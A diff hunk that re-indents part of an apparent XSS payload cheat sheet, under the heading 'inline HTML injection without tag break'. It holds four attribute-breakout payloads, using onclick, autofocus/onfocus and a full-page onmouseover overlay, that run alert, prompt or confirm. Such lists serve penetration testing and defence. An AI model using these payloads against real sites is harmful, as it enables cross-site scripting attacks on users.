@@ -26,13 +26,13 @@
 
 ### INLINE HTML INJECTION WITHOUT TAG BREAK:
   
-  " onclick=alert(1)//">click
-  
-  " autofocus onfocus=alert(1) "
-  
-  " onfocus=prompt(1) autofocus fragment="
-  
-  " onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"
+      " onclick=alert(1)//">click
+      
+      " autofocus onfocus=alert(1) "
+      
+      " onfocus=prompt(1) autofocus fragment="
+      
+      " onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"
 
 
 ### JAVASCRIPT INJECTION:
